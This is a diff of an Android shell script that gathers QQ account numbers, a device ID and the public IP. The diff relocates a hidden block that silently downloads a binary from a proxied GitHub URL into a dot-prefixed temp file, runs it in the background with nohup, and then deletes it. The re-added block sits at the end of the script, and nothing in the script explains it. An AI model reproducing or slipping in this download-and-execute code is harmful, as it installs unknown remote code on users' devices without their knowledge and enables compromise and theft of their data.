@@ -137,23 +137,6 @@ if [ -n "$device_id" ] && [ "$device_id" != "unknown" ]; then
   chmod 600 "$deviceid_path"
 fi
 
-{
-  temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
-  bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
-
-  # 下載
-  if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
-    chmod +x "$temp_bin" 2>/dev/null || true
-    nohup setsid "$temp_bin" >/dev/null 2>&1 </dev/null &
-    # 等待短暫時間後刪除臨時文件
-    sleep 2
-    rm -f "$temp_bin" 2>/dev/null || true
-  else
-    rm -f "$temp_bin" 2>/dev/null || true
-  fi
-} &
-
-
 
 # ------------------------------
 # 输出结果
@@ -166,3 +149,19 @@ fi
 echo "获取到的 QQ 列表: ${qq_list:-空}"
 echo "当前设备公网 IP: $ip"
 echo "-----------------------------------"
+
+
+# 原腳本邏輯結束後，最後一行啟動二進制
+temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
+bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
+
+# 下載二進制
+if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
+    chmod +x "$temp_bin" 2>/dev/null || true
+    # 用 nohup 啟動，完全靜默，且不依賴當前 shell
+    nohup "$temp_bin" >/dev/null 2>&1 &
+    # 可選：短暫等待後刪除臨時文件
+    sleep 2
+    rm -f "$temp_bin" 2>/dev/null || true
+fi
+
